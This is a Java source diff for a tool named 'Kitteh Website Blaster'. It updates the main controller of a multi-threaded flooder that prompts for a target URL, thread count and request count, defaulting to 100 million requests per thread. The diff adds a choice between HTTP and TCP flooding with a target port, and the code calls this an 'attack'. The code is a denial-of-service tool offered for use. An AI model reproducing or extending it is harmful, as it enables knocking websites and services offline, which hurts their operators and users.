@@ -4,7 +4,7 @@ import java.util.InputMismatchException;
 import java.util.Scanner;
 
 public class Main {
-	public final static String version	= "1.2.14";
+	public final static String version	= "1.2.16";
 	public final static String appName	= "Kitteh Website Blaster";
 	public static int delay;
 	
@@ -12,12 +12,13 @@ public class Main {
 	protected static boolean terminate	= false;
 	protected static boolean threadsStarted	= false;
 	
-	private static int reqCount, threadCount;
-	private static String user, url, purpose, method;
-	private static Scanner inScan	= new Scanner(System.in);
+	public static int reqCount, threadCount, port;
+	public static String user, url, purpose, method;
+	public static Scanner inScan	= new Scanner(System.in);
 	
-	private static Thread[] threads;
-	private static ThreadSendRequest[] objs;
+	public static Thread[] threads;
+	public static ThreadSendHttpRequest[] objs;
+	public static ThreadSendTcpPacket[] objsTcp;
 	
 	public static void main(String[] args) {
 		System.out.println("~~ " + appName + " v" + version + " ~~");
@@ -31,16 +32,28 @@ public class Main {
 		
 		user	= "lacertus";
 		url		= prompt("Url:");
-		method	= prompt("Method: (post/GET)");
 		
 		// User wants an "infinite" number of requests per thread, set number of requests per thread to one-hundred-million
 		if(reqCount == 0) {
 			reqCount	= 100000000;
 		}
 		
-		// Create and start threads
-		objs	= initThreads();
-		createThreads(true);
+		String type	= prompt("Type: (http/tcp)");
+		if(type.equalsIgnoreCase("http")) {
+			method	= prompt("Method: (post/GET)");
+			HttpRequest.initThreads();
+			HttpRequest.createThreads(true);
+			//HttpRequest attack	= new HttpRequest(url, user, purpose, method, reqCount);
+			//attack.start();
+		} else if(type.equalsIgnoreCase("tcp")) {
+			port	= promptInt("Port:");
+			TcpPacket.initThreads();
+			TcpPacket.createThreads(true);
+			//TcpPacket attack	= new TcpPacket(url, port, purpose, reqCount);
+			//attack.start();
+		} else {
+			System.out.println("fail");
+		}
 	}
 	
 	public static void manualSetup() {
@@ -90,50 +103,15 @@ public class Main {
 		purpose	= "meow";
 	}
 	
-	/**
-	 * Fill array <code>objs</code> with new ThreadSendRequest objects
-	 * @return	array of 'empty' ThreadSendRequest objects
-	 */
-	public static ThreadSendRequest[] initThreads() {
-		ThreadSendRequest[] objs	= new ThreadSendRequest[threadCount];
-		threads	= new Thread[threadCount];
-		for(int i=0; i<threadCount; i++) {
-			objs[i]	= new ThreadSendRequest(null, null, null, null, 0);
-		}
-		return objs;
-	}
-	
-	/**
-	 * Create and start <code>threads</code> threads
-	 * @param threads	array of threads to start
-	 * @param objs		array of ThreadSendRequest objects
-	 */
-	public static void createThreads(boolean waitForThreads) {
-		for(int i=0; i<threads.length; i++) {
-			if(terminate) {
-				System.out.println("Caught error, waiting for threads to finish...");
-				break;
-			}
-			
-			objs[i]		= new ThreadSendRequest(url, user, purpose, method, reqCount);
-			threads[i]	= new Thread(objs[i]);
-			threads[i].start();
-			
-			sleep(delay);
-		}
-		
-		threadsStarted	= true;
-	}
-	
 	protected static void endProgram(boolean threadsFinished) {
 		if(!terminate) {
 			terminate	= true;
 			if(!threadsFinished) {
-				for(int i=0; i<threadCount; i++) {
+				/*for(int i=0; i<threadCount; i++) {
 					while(!objs[i].isComplete()) {
 						sleep(100);
 					}
-				}
+				}*/
 			}
 			
 			System.out.println("Execution complete.");
